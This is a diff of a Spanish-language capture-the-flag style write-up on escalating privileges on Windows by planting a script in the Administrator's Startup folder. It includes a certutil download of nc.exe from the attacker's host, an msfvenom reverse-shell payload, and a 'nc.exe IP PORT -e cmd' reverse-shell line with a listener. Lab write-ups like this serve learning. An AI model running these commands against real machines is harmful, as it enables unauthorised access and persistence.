@@ -1,14 +1,30 @@
 Root.txt
 
-Mirar cosas: privs usuario, procesos, ...
+Una vez nos conectamos con de forma remota, abrimos una powershell y empezamos con la enumeracion y busqueda de alguna vulnerabilidad que nos permita realizar la escalada de privilegios.
 
-Mirar ...startUp\
+Miramos nuestros prvilegios:
+    - whoami /all
+    - net user username
+Pero no hay nada util, miramos los puertos, procesos, posibles servicios internos, etc. Pero nada.
 
-uyba si puedo crear ficheros.
+Miramos ahora la start folder:
+    - cd  C:\Users\Administrador\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp\
 
-instalar nc.exe con certutil.
+Todos los archivos que hay en esta ruta, se ejecutan cada vez que un usuario inicia sesion como ese usuario.
 
-crear archivo k ejecute el nc.exe: path\nc.exe IP PORT -e cmd:
-write-output "nc.exe: path\nc.exe IP PORT -e cmd" > file.ps1
+Mirar si tenemos privilegios para crear archivos en esta ruta:
+    echo #hola > hola.txt 
 
-y cuando se conecte un usuario me conectare como ese usuario. Cruzo los dedos para k sea admin el k se conecte :)
+
+Nos descargamos el nc.exe, pero no en esta ruta, hacerlo en C:\Users\username\Desktop, para evitar problemas:
+    - En nuestro PC -> python3 -m http.server
+    - certutil -urlcache -split -f http://IP:PORT/nc.exe
+Si no tenemos el nc.exe, podemos crearnos uno con msfvenom:
+    - msfvenom -p windows/x64/powershell_reverse_tcp -ax64 LHOST=nuestra_IP LPORT=PORT -f exe > nc.exe
+
+Creamos, ahora si, en el directorio C:\Users\Administrador\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp\, un fichero:
+    - write-output "nc.exe: path\nc.exe IP PORT -e cmd" > file.ps1
+
+y en nuestra PC hacemos un nc -> nc -lvp PORT
+
+Esperamos un minuto y vemos si algun usuario inicia sesion.
